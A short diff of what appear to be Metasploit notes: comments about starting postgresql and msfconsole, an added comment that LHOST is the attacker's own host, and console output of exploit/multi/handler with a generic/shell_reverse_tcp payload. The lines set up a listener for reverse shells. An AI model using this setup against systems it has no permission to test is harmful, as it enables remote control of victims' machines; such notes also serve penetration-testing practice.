@@ -1,6 +1,6 @@
 # start postgresql
 # use msfconsole
-
+# LHOST current host not victim
 
 use exploit/multi/handler 
 [*] Using configured payload generic/shell_reverse_tcp
